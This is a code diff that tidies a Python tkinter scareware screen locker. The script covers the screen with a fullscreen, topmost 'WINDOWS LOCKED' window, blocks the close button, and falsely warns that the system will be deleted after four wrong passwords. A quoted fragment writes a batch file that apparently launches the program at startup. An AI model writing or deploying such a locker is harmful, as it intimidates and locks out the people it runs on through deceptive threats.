@@ -3,19 +3,19 @@ from tkinter import *
 from tkinter import messagebox
 import os
 
-#PASS
+# PASS
 password = '123'
 
 def btn_click():
-	k = ent.get()
-	if k == password:
-		messagebox.showinfo(title = 'Success', message = 'Windows unlocked\nClick OK')
-		root.destroy()
-	else:
-		messagebox.showwarning(title = 'Error', message = 'Wrong password')
+    k = ent.get()
+    if k == password:
+        messagebox.showinfo(title='Success', message='Windows unlocked\nClick OK')
+        root.destroy()
+    else:
+        messagebox.showwarning(title='Error', message='Wrong password')
 
 def exits():
-	messagebox.showwarning(title = 'Error', message = 'Wrong password. You have 4 attempts, after which your system will be deleted')
+    messagebox.showwarning(title='Error', message='Wrong password. You have 4 attempts, after which your system will be deleted')
 
 playsound('data/sound.mp3', False)
 
@@ -28,31 +28,29 @@ playsound('data/sound.mp3', False)
         bat_file.write(r'start "" %s' % file_path)
 '''
 
-root = Tk() 
 root = Tk()
 root.title('Windows locked')
 root.attributes('-fullscreen', True, '-topmost', True)
 root.geometry('3840x2160')
-root['bg']= 'black'
+root['bg'] = 'black'
 
-background_image = PhotoImage(file='data/bg2.png', height=25)
-background_label = Label(root, image=background_image, bg='black')
-background_label.pack()
+root.bg_img1 = PhotoImage(file='data/bg2.png')
+background_label1 = Label(root, image=root.bg_img1, bg='black')
+background_label1.pack()
 
-background_image = PhotoImage(file='data/clown.png',)
-background_label = Label(root, image=background_image, bg='black')
-background_label.pack()
+root.bg_img2 = PhotoImage(file='data/clown.png')
+background_label2 = Label(root, image=root.bg_img2, bg='black')
+background_label2.pack()
 
-Label(root, text='WINDOWS LOCKED', font = 'Fixedsys 65', bg='black', fg='red').pack()
+Label(root, text='WINDOWS LOCKED', font='Fixedsys 65', bg='black', fg='red').pack()
 Label(root, text='Enter the password to unlock windows', font='Fixedsys 30', bg='black', fg='white').pack()
 
 ent = Entry(root, font=('Arial', 25), width=15, show='*')
 ent.pack()
 
-Button(root, text = 'Unlock', font = 'Fixedsys 25', bg='red', fg='white', command=btn_click).pack(pady=25)
+Button(root, text='Unlock', font='Fixedsys 25', bg='red', fg='white', command=btn_click).pack(pady=25)
 root.bind('<Return>', lambda event: btn_click())
 
 root.protocol('WM_DELETE_WINDOW', exits)
+
 root.mainloop()
-
-
